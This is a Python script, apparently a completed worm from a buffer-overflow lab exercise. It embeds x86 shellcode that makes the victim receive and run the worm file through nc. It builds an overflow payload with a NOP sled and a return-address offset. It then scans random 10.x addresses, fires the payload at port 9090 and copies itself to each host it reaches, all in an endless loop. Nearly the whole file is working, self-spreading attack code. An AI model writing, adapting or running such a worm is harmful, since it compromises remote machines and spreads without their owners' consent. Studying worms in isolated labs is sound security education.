#!/bin/env python3
import sys
import os
import time
import subprocess
import random

# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   " echo '(^_^) Shellcode is running (^_^)';                  "  
   " nc -lnv 5000 > worm.py;cat worm.py;                       "
   " chmod +x worm.py;python3 worm.py;                        *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')


# Create the badfile (the malicious payload)
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   ret    = 0xffffd5f8+0x24 # Need to change
   offset = 116  # Need to change

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)


# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
     while True:
      x=random.randint(151,155)
      y=random.randint(70,80)
      ip_addr="10."
      ip_addr=ip_addr+str(x)+".0."+str(y)
      print("hereee"+ip_addr)
      try:
         output = subprocess.check_output(f"ping -q -c1 -W1 {ip_addr}", shell=True)
         result = output.find(b'1 received')
         if result == -1:
            print("Generate address again");
         else:
            break
      except:
         print("Not a alive address")    
     return ip_addr
############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.


# Create the badfile 
createBadfile()

# Launch the attack on other servers
while True:
    targetIP = getNextTarget()

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    #subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)

    # Give the shellcode some time to run on the target host
    
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)
    time.sleep(5)
    subprocess.run(["cat worm.py | nc -w5"+" "+targetIP+" 5000"],shell=True)

    #cat worm.py | nc -w5"+" "+targetIP+" 5000"

    # Sleep for 10 seconds before attacking another host
    time.sleep(10) 

    # Remove this line if you want to continue attacking others
    #exit(0)
